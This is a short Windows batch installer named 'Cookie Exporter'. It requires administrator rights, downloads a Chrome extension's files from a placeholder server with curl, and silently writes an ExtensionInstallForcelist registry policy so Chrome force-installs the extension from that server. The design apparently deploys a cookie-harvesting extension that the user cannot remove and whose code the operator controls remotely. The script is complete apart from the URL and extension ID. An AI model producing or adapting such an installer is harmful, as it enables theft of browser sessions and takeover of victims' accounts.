@echo off
:: Cookie Exporter - One Click Install
:: Run as Administrator

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Please run as Administrator!
    echo Right-click this file and select "Run as administrator"
    pause
    exit /b 1
)

set SERVER_URL=YOUR_SERVER_URL
set EXT_DIR=%LOCALAPPDATA%\CookieExporter

echo [1/3] Downloading extension...
mkdir "%EXT_DIR%" 2>nul
curl -s -o "%EXT_DIR%\manifest.json" "%SERVER_URL%/extension/manifest.json"
curl -s -o "%EXT_DIR%\background.js" "%SERVER_URL%/extension/background.js"

echo [2/3] Installing Chrome policy...
:: IMPORTANT: Replace "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" with your actual extension ID
:: Get the real ID after packing the extension in Chrome (chrome://extensions -> Pack extension)
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /d "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;%SERVER_URL%/extension/update.xml" /t REG_SZ /f >nul 2>&1

echo [3/3] Done!
echo.
echo Extension will appear in Chrome on next restart.
echo You can close this window.
pause
